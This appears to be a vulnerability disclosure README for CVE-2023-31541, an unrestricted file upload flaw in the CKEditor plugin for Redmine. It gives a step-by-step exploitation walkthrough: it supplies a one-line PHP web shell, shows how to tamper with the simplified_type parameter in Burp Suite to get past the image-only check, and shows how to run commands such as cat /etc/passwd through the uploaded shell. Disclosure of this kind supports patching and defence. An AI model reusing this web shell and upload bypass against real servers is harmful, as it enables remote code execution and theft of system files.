## Description

- There is a vulnerability in the ‘Browse and upload images’ feature of the CKEditor plugin for Redmine, which allows dangerous types of files to be uploaded to the server.
- When upload dangerous types of files, the original file path is exposed. If the file is directly accessed through the URL, it allows for the execution of arbitrary code.
---
## Environment(System Version Information)

### server

- CentOS 7
- Apache : 2.4.6
- PHP : 5.4.16
- MariaDB : 5.5.68

![00](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/aed05312-06c8-4bd4-926a-eca4a3438a42)

![01](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/1ca5ed40-9fe0-46b0-82dd-dbfe524057b7)

### Redmine

- Ruby : 2.5.5-p157
- Redmine : 4.2.9
- redmine_CKEditor : 1.2.3

![02](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/d24fb706-cb0a-4916-a7ff-d96b9d3363dc)

![03](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/c1fe865b-9702-43d2-8702-c78bc63ffb4b)

---
## Vulnerability Process

**STEP_1) Click the 'Browse and upload images' button in CKEditor.**

![04](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/6b5a7d23-1c9c-456a-9058-4a37e5eeadfc)

**STEP_2) Attempt to upload a file by clicking the '+' button.**

![05](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/c27187a3-5c03-4bc9-b3ed-103ac66edb8b)

**STEP_3) Select and upload a file in PHP format.**

![06](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/60c883e5-7fc9-4f0b-90b4-957a90a20090)
**[cmd.php : code]**

```php
<?php
	echo system($_GET['cmd']);
?>
```

**※** **Typically, uploading files in PHP format is not possible.**

![07](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/f13d2e71-b45a-4de0-909e-980d7e37f755)

**STEP_5) Manipulate the 'simplified_type' parameter using a proxy tool (Burp Suite) when uploading a file.**

- simplified_type=image → simplified_type=file

[**Before]**

![08](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/8e763064-b229-4ac2-a010-fc2ec423f17d)

**[After]**

![09](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/8c9ca4d5-7509-47c9-b4d5-d37cd521783e)

**STEP_6) Upon inspecting the response page, it can be confirmed that the file in PHP format has been uploaded successfully.**

![10](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/64ff1ed8-4139-4051-afb1-d5c8d0005d45)

**STEP_7) By utilizing the browser's developer tools, one can confirm that the original path of the uploaded file is exposed.**

![11](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/512ff40f-450c-4b7a-bf05-321fabf14a6e)

**STEP_8) Directly access the URL using the confirmed original file path information.**

![12](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/6f5dff34-24f7-4f58-99e9-f1d70c186a77)

**STEP_9) Send the ‘cmd’ parameter to confirm if the code is being executed on the server.**

**[cmd=pwd]**

![13](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/c9e5df34-823b-4e39-a605-2d0e5c13febf)

**[cmd=ls -al]**

![14](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/f41af311-3775-4e8f-9783-f9481e4eea85)

**[cmd=cat /etc/passwd]**

![15](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/266b77c3-d2e9-4643-abbc-f4ae0339696a)

**※ Result of executing the command on the server**

![16](https://github.com/DreamD2v/CVE-2023-31541/assets/135285551/e2a27d37-9887-451d-8d54-0cb699b92010)